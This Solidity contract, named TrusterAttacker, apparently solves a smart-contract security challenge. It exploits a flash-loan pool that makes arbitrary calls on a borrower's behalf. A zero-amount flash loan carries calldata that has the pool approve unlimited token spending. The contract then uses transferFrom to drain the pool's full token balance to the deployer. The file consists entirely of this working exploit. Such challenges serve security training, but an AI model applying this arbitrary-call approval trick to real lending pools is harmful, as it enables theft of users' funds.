// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract TrusterAttacker {

    IPool immutable pool;
    IERC20 immutable token;
    address private attacker;

    constructor (address _poolAddress, address _tokenAddress) {
        pool = IPool(_poolAddress);
        token = IERC20(_tokenAddress);
        attacker = msg.sender;
    }

    function attack() external {
        // Approve unlimited spending of pool Through flashloan 
            bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 2 ** 256 - 1);
            pool.flashLoan(0, address(this), address(token), data);

        // Send all the tokens from the pool to the attacker
            uint balance = token.balanceOf(address(pool));
            token.transferFrom(address(pool), attacker, balance);

    }
}